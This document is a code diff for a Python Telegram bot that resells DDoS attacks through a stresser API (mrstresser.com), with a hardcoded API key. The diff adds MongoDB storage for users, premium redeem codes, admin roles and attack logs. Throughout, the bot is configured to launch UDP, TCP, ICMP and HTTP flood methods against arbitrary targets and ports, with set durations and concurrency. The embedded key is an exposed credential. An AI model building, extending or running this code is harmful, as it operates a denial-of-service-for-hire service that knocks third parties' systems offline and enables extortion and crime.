@@ -16,6 +16,7 @@ from telegram.ext import (
     filters, 
     ContextTypes
 )
+from pymongo import MongoClient
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -24,11 +25,12 @@ load_dotenv()
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
 API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
+MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 
 # CONCURRENT SETTINGS
-DEFAULT_CONCURRENT = 4
+DEFAULT_CONCURRENT = int(os.getenv("DEFAULT_CONCURRENT", "4"))
 MIN_CONCURRENT = 1
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
@@ -36,7 +38,7 @@ MAX_DURATION = 300
 
 # ATTACK METHODS - UDP-FLOOD as default
 ATTACK_METHODS = [
-    "UDP-FLOOD",  # DEFAULT - maps to udp-free in API
+    "UDP-FLOOD",  # DEFAULT
     "UDP-VSE", "UDP-DNS",
     "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
     "ICMP-FLOOD", "GRE-FLOOD",
@@ -66,206 +68,527 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ===== DATABASE (In-Memory Fallback) =====
+# ===== DATABASE =====
 class Database:
-    def __init__(self):
+    def __init__(self, mongo_uri):
+        self.memory_mode = True
         self.users = {}
         self.codes = {}
         self.logs = []
         self.admins = {}
         self.settings = {"pause_all": False}
-        self.memory_mode = True
-        logger.info("📦 Using in-memory storage")
+        
+        try:
+            if mongo_uri:
+                self.client = MongoClient(
+                    mongo_uri,
+                    serverSelectionTimeoutMS=5000,
+                    connectTimeoutMS=5000,
+                    socketTimeoutMS=5000
+                )
+                self.client.admin.command('ping')
+                
+                self.db = self.client["guru_bot"]
+                self.users_col = self.db.users
+                self.codes_col = self.db.redeem_codes
+                self.logs_col = self.db.attack_logs
+                self.admins_col = self.db.admins
+                self.settings_col = self.db.settings
+                
+                self.users_col.create_index("user_id", unique=True)
+                self.codes_col.create_index("code", unique=True)
+                self.admins_col.create_index("user_id", unique=True)
+                
+                if not self.settings_col.find_one({"_id": "bot_settings"}):
+                    self.settings_col.insert_one({
+                        "_id": "bot_settings",
+                        "pause_all": False,
+                        "paused_by": None,
+                        "paused_at": None,
+                        "pause_reason": None
+                    })
+                
+                self.memory_mode = False
+                logger.info("✅ MongoDB connected successfully!")
+            else:
+                raise Exception("No MongoDB URI provided")
+        except Exception as e:
+            logger.error(f"❌ MongoDB connection failed: {e}")
+            self.memory_mode = True
+            logger.warning("⚠️ Using in-memory storage")
     
     def add_user(self, user_id, username=None, first_name=None):
-        if user_id not in self.users:
-            self.users[user_id] = {
-                "user_id": user_id,
-                "username": username,
-                "first_name": first_name,
-                "plan": "free",
-                "plan_expiry": None,
-                "has_used_code": False,
-                "is_banned": False,
-                "attack_count": 0
-            }
-            return True
-        return False
+        try:
+            if self.memory_mode:
+                if user_id not in self.users:
+                    self.users[user_id] = {
+                        "user_id": user_id,
+                        "username": username,
+                        "first_name": first_name,
+                        "plan": "free",
+                        "plan_expiry": None,
+                        "has_used_code": False,
+                        "is_banned": False,
+                        "attack_count": 0,
+                        "created_at": datetime.now()
+                    }
+                    return True
+                return False
+            else:
+                result = self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$setOnInsert": {
+                        "username": username,
+                        "first_name": first_name,
+                        "plan": "free",
+                        "plan_expiry": None,
+                        "has_used_code": False,
+                        "is_banned": False,
+                        "attack_count": 0,
+                        "created_at": datetime.now()
+                    }},
+                    upsert=True
+                )
+                return True
+        except Exception as e:
+            logger.error(f"Error adding user: {e}")
+            return False
     
     def get_user(self, user_id):
-        return self.users.get(user_id)
+        try:
+            if self.memory_mode:
+                return self.users.get(user_id)
+            else:
+                return self.users_col.find_one({"user_id": user_id})
+        except Exception as e:
+            logger.error(f"Error getting user: {e}")
+            return None
     
     def get_user_plan(self, user_id):
-        user = self.get_user(user_id)
-        if not user:
+        try:
+            user = self.get_user(user_id)
+            if not user:
+                return "free", None
+            
+            plan = user.get("plan", "free")
+            expiry = user.get("plan_expiry")
+            
+            if plan == "free":
+                return "free", None
+            
+            if plan == "premium":
+                if expiry is None:
+                    return "premium", None
+                
+                if isinstance(expiry, str):
+                    try:
+                        expiry = datetime.fromisoformat(expiry)
+                    except:
+                        return "premium", None
+                
+                if expiry and isinstance(expiry, datetime):
+                    if expiry < datetime.now():
+                        return "premium", expiry
+                    else:
+                        return "premium", expiry
+                else:
+                    return "premium", None
+            
+            return plan, expiry
+        except Exception as e:
+            logger.error(f"Error getting user plan: {e}")
             return "free", None
-        plan = user.get("plan", "free")
-        expiry = user.get("plan_expiry")
-        if expiry and isinstance(expiry, str):
-            try:
-                expiry = datetime.fromisoformat(expiry)
-            except:
-                expiry = None
-        return plan, expiry
     
     def update_user_plan(self, user_id, plan, expiry):
-        if user_id in self.users:
-            self.users[user_id]["plan"] = plan
-            self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
-            return True
-        return False
+        try:
+            if self.memory_mode:
+                if user_id in self.users:
+                    self.users[user_id]["plan"] = plan
+                    self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
+                    return True
+                return False
+            else:
+                expiry_str = expiry.isoformat() if expiry else None
+                result = self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$set": {
+                        "plan": plan,
+                        "plan_expiry": expiry_str,
+                        "has_used_code": True if plan == "premium" else False
+                    }}
+                )
+                return result.modified_count > 0 or result.matched_count > 0
+        except Exception as e:
+            logger.error(f"Error updating user plan: {e}")
+            return False
     
     def is_admin(self, user_id):
-        return user_id in self.admins
+        try:
+            if self.memory_mode:
+                return user_id in self.admins
+            else:
+                return self.admins_col.find_one({"user_id": user_id}) is not None
+        except:
+            return False
+    
+    def get_admin_level(self, user_id):
+        try:
+            if self.memory_mode:
+                return self.admins.get(user_id, {}).get("level")
+            else:
+                admin = self.admins_col.find_one({"user_id": user_id})
+                return admin.get("level") if admin else None
+        except:
+            return None
     
     def is_owner_or_pseudo(self, user_id):
-        return user_id in self.admins and self.admins[user_id].get("level") in ["owner", "pseudo_owner"]
+        level = self.get_admin_level(user_id)
+        return level in ["owner", "pseudo_owner"]
     
     def add_admin(self, user_id, username, level, added_by):
-        if user_id in self.admins:
+        try:
+            if self.is_admin(user_id):
+                return False
+            
+            if self.memory_mode:
+                self.admins[user_id] = {"user_id": user_id, "level": level}
+                if user_id in self.users:
+                    self.users[user_id]["plan"] = "premium"
+                return True
+            else:
+                self.admins_col.insert_one({
+                    "user_id": user_id,
+                    "username": username,
+                    "level": level,
+                    "added_by": added_by,
+                    "added_at": datetime.now()
+                })
+                self.update_user_plan(user_id, "premium", None)
+                return True
+        except Exception as e:
+            logger.error(f"Error adding admin: {e}")
             return False
-        self.admins[user_id] = {"user_id": user_id, "level": level}
-        if user_id in self.users:
-            self.users[user_id]["plan"] = "premium"
-        return True
     
     def remove_admin(self, user_id):
-        if user_id in self.admins:
-            del self.admins[user_id]
-            return True
-        return False
+        try:
+            if self.memory_mode:
+                if user_id in self.admins:
+                    del self.admins[user_id]
+                    return True
+                return False
+            else:
+                result = self.admins_col.delete_one({"user_id": user_id})
+                return result.deleted_count > 0
+        except:
+            return False
     
     def get_admins(self):
-        return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
+        try:
+            if self.memory_mode:
+                return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
+            else:
+                return list(self.admins_col.find({}))
+        except:
+            return []
     
     def is_banned(self, user_id):
-        user = self.get_user(user_id)
-        return user.get("is_banned", False) if user else False
+        try:
+            user = self.get_user(user_id)
+            return user.get("is_banned", False) if user else False
+        except:
+            return False
     
     def ban_user(self, user_id, reason=None, banned_by=None):
-        if user_id in self.users:
-            self.users[user_id]["is_banned"] = True
-            self.users[user_id]["ban_reason"] = reason
-            return True
-        return False
+        try:
+            if self.memory_mode:
+                if user_id in self.users:
+                    self.users[user_id]["is_banned"] = True
+                    self.users[user_id]["ban_reason"] = reason
+                return True
+            else:
+                self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
+                )
+                return True
+        except:
+            return False
     
     def unban_user(self, user_id):
-        if user_id in self.users:
-            self.users[user_id]["is_banned"] = False
-            self.users[user_id]["ban_reason"] = None
-            return True
-        return False
+        try:
+            if self.memory_mode:
+                if user_id in self.users:
+                    self.users[user_id]["is_banned"] = False
+                    self.users[user_id]["ban_reason"] = None
+                return True
+            else:
+                self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
+                )
+                return True
+        except:
+            return False
     
     def create_code(self, code, days, created_by):
-        if code in self.codes:
+        try:
+            if self.memory_mode:
+                if code in self.codes:
+                    return False
+                self.codes[code] = {
+                    "code": code,
+                    "access_days": days,
+                    "created_by": created_by,
+                    "created_at": datetime.now(),
+                    "is_used": False
+                }
+                return True
+            else:
+                if self.codes_col.find_one({"code": code}):
+                    return False
+                self.codes_col.insert_one({
+                    "code": code,
+                    "access_days": days,
+                    "created_by": created_by,
+                    "created_at": datetime.now(),
+                    "used_by": None,
+                    "used_at": None,
+                    "is_used": False
+                })
+                return True
+        except Exception as e:
+            logger.error(f"Error creating code: {e}")
             return False
-        self.codes[code] = {
-            "code": code,
-            "access_days": days,
-            "created_by": created_by,
-            "created_at": datetime.now(),
-            "is_used": False
-        }
-        return True
     
     def use_code(self, code, user_id):
-        if code not in self.codes or self.codes[code].get("is_used"):
+        try:
+            if self.memory_mode:
+                if code not in self.codes or self.codes[code].get("is_used"):
+                    return None
+                
+                code_data = self.codes[code]
+                code_data["is_used"] = True
+                code_data["used_by"] = user_id
+                code_data["used_at"] = datetime.now()
+                
+                days = code_data["access_days"]
+                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
+                
+                if user_id not in self.users:
+                    self.add_user(user_id)
+                self.users[user_id]["plan"] = "premium"
+                self.users[user_id]["plan_expiry"] = expiry
+                self.users[user_id]["has_used_code"] = True
+                return code_data
+            else:
+                code_data = self.codes_col.find_one({"code": code, "is_used": False})
+                if not code_data:
+                    return None
+                
+                self.codes_col.update_one(
+                    {"code": code},
+                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
+                )
+                
+                days = code_data["access_days"]
+                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
+                
+                if not self.get_user(user_id):
+                    self.add_user(user_id)
+                
+                expiry_str = expiry.isoformat() if expiry else None
+                
+                self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$set": {
+                        "plan": "premium",
+                        "plan_expiry": expiry_str,
+                        "has_used_code": True,
+                        "code_used": code,
+                        "redeem_date": datetime.now().isoformat()
+                    }}
+                )
+                
+                return code_data
+        except Exception as e:
+            logger.error(f"Error using code: {e}")
             return None
-        
-        code_data = self.codes[code]
-        code_data["is_used"] = True
-        code_data["used_by"] = user_id
-        code_data["used_at"] = datetime.now()
-        
-        days = code_data["access_days"]
-        expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
-        
-        if user_id not in self.users:
-            self.add_user(user_id)
-        self.users[user_id]["plan"] = "premium"
-        self.users[user_id]["plan_expiry"] = expiry
-        self.users[user_id]["has_used_code"] = True
-        return code_data
     
     def get_codes(self, only_unused=False):
-        codes = list(self.codes.values())
-        if only_unused:
-            codes = [c for c in codes if not c.get("is_used")]
-        return codes
+        try:
+            if self.memory_mode:
+                codes = list(self.codes.values())
+                if only_unused:
+                    codes = [c for c in codes if not c.get("is_used")]
+                return codes
+            else:
+                query = {"is_used": False} if only_unused else {}
+                return list(self.codes_col.find(query).sort("created_at", -1))
+        except:
+            return []
     
     def delete_code(self, code):
-        if code in self.codes:
-            del self.codes[code]
-            return True
-        return False
-    
-    def get_all_users(self):
-        return list(self.users.values())
+        try:
+            if self.memory_mode:
+                if code in self.codes:
+                    del self.codes[code]
+                    return True
+                return False
+            else:
+                result = self.codes_col.delete_one({"code": code})
+                return result.deleted_count > 0
+        except:
+            return False
     
     def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
-        log = {
-            "user_id": user_id,
-            "target": target,
-            "port": port,
-            "duration": duration,
-            "method": method,
-            "status": status,
-            "concurrent": concurrent_count,
-            "timestamp": datetime.now()
-        }
-        self.logs.append(log)
-        
-        if user_id in self.users:
-            self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
-        return True
+        try:
+            log = {
+                "user_id": user_id,
+                "target": target,
+                "port": port,
+                "duration": duration,
+                "method": method,
+                "status": status,
+                "concurrent": concurrent_count,
+                "response": response[:500] if response else None,
+                "timestamp": datetime.now()
+            }
+            
+            if self.memory_mode:
+                self.logs.append(log)
+            else:
+                self.logs_col.insert_one(log)
+            
+            # Update user attack count
+            if self.memory_mode:
+                if user_id in self.users:
+                    self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
+            else:
+                self.users_col.update_one(
+                    {"user_id": user_id},
+                    {"$inc": {"attack_count": 1},
+                     "$set": {"last_attack_time": datetime.now().isoformat(),
+                              "last_attack_duration": duration}}
+                )
+            return True
+        except:
+            return False
     
     def get_total_attacks(self):
-        return len(self.logs)
+        try:
+            if self.memory_mode:
+                return len(self.logs)
+            else:
+                return self.logs_col.count_documents({})
+        except:
+            return 0
     
     def get_user_stats(self, user_id):
-        return len([l for l in self.logs if l.get("user_id") == user_id])
+        try:
+            if self.memory_mode:
+                return len([l for l in self.logs if l.get("user_id") == user_id])
+            else:
+                return self.logs_col.count_documents({"user_id": user_id})
+        except:
+            return 0
+    
+    def get_all_users(self):
+        try:
+            if self.memory_mode:
+                return list(self.users.values())
+            else:
+                return list(self.users_col.find({}))
+        except:
+            return []
     
     def get_pause_info(self):
-        return {"paused": self.settings.get("pause_all", False)}
+        try:
+            if self.memory_mode:
+                return {"paused": self.settings.get("pause_all", False)}
+            else:
+                settings = self.settings_col.find_one({"_id": "bot_settings"})
+                if settings:
+                    return {
+                        "paused": settings.get("pause_all", False),
+                        "paused_by": settings.get("paused_by"),
+                        "paused_at": settings.get("paused_at"),
+                        "pause_reason": settings.get("pause_reason")
+                    }
+                return {"paused": False}
+        except:
+            return {"paused": False}
     
     def set_pause(self, paused, paused_by=None, reason=None):
-        self.settings["pause_all"] = paused
-        return True
+        try:
+            if self.memory_mode:
+                self.settings["pause_all"] = paused
+            else:
+                self.settings_col.update_one(
+                    {"_id": "bot_settings"},
+                    {"$set": {
+                        "pause_all": paused,
+                        "paused_by": paused_by,
+                        "paused_at": datetime.now() if paused else None,
+                        "pause_reason": reason
+                    }},
+                    upsert=True
+                )
+            return True
+        except:
+            return False
 
-db = Database()
+db = Database(MONGO_URI)
 
 # ===== INITIALIZE OWNERS =====
 def init_owners():
     try:
-        if not db.get_user(OWNER_ID):
+        owner = db.get_user(OWNER_ID)
+        if not owner:
             db.add_user(OWNER_ID, "owner", "Owner")
+        
         if not db.is_admin(OWNER_ID):
             db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
-        db.update_user_plan(OWNER_ID, "premium", None)
-        logger.info(f"✅ Owner {OWNER_ID} initialized")
         
-        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != OWNER_ID:
-            if not db.get_user(PSEUDO_OWNER_ID):
+        plan, expiry = db.get_user_plan(OWNER_ID)
+        if plan != "premium":
+            db.update_user_plan(OWNER_ID, "premium", None)
+        logger.info(f"✅ Owner {OWNER_ID} initialized")
+    except Exception as e:
+        logger.error(f"Error initializing owner: {e}")
+
+def init_pseudo_owner():
+    try:
+        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
+            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
+            if not pseudo_owner:
                 db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
+            
             if not db.is_admin(PSEUDO_OWNER_ID):
                 db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
-            db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
+            
+            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
+            if plan != "premium":
+                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
             logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
     except Exception as e:
-        logger.error(f"Error initializing owners: {e}")
+        logger.error(f"Error initializing pseudo owner: {e}")
 
 init_owners()
+init_pseudo_owner()
 
 # ===== API FUNCTIONS =====
-async def send_api_attack(target, port, duration, method, concurrent=1):
+async def send_api_attack(target, port, duration, method, concurrent):
     """Send attack to API with proper concurrent parameter"""
-    if not API_KEY:
+    api_key = API_KEY
+    api_url = API_URL
+    
+    if not api_key:
         return {"success": False, "error": "API Key missing"}
     
     api_method = METHOD_MAP.get(method.upper(), "udp-free")
     
     params = {
-        "key": API_KEY,
+        "key": api_key,
         "host": target,
         "port": str(port),
         "time": str(duration),
@@ -273,7 +596,6 @@ async def send_api_attack(target, port, duration, method, concurrent=1):
         "concs": str(concurrent)
     }
     
-    # Advanced options for L7 methods
     if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
         params["req_method"] = "GET"
         params["geoloc"] = "MIX"
@@ -281,7 +603,9 @@ async def send_api_attack(target, port, duration, method, concurrent=1):
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json, text/plain, */*"
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive"
     }
     
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
@@ -292,7 +616,8 @@ async def send_api_attack(target, port, duration, method, concurrent=1):
     try:
         async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
             start_time = time.time()
-            async with session.get(API_URL, params=params) as response:
+            
+            async with session.get(api_url, params=params) as response:
                 elapsed = time.time() - start_time
                 response_text = await response.text(encoding='utf-8', errors='ignore')
                 
@@ -361,7 +686,7 @@ class AttackManager:
         
         return True, "OK"
     
-    async def start_attack(self, user_id, target, port, duration, method, context, concurrent=DEFAULT_CONCURRENT):
+    async def start_attack(self, user_id, target, port, duration, method, context, concurrent):
         async with self.lock:
             if self.is_running:
                 return None, "Attack already in progress!"
@@ -439,9 +764,7 @@ class AttackManager:
                 f"🔄 Concurrent: **{concurrent}**\n"
                 f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             )
-            
-            # We'll send alerts via context in the main function
-            # This is handled in execute_attack
+            # Alerts are sent via context in execute_attack
         except:
             pass
     
@@ -682,6 +1005,7 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
             await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
             return
         
+        # Update the global variable
         global DEFAULT_CONCURRENT
         DEFAULT_CONCURRENT = new_concurrent
         
